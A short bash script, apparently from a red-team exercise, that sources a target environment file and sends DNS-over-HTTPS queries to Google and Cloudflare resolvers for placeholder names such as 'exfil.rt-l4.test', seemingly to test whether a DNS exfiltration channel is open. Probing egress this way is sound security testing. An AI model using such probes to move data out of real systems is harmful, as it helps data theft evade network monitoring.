#!/bin/bash
. /opt/rt/work/target.env
curl -s -m 5 -H 'accept: application/dns-json'   'https://dns.google/resolve?name=exfil.rt-l4.test&type=TXT' || true
curl -sk -m 5 'https://1.1.1.1/dns-query?name=x.rt-l4.test' || true
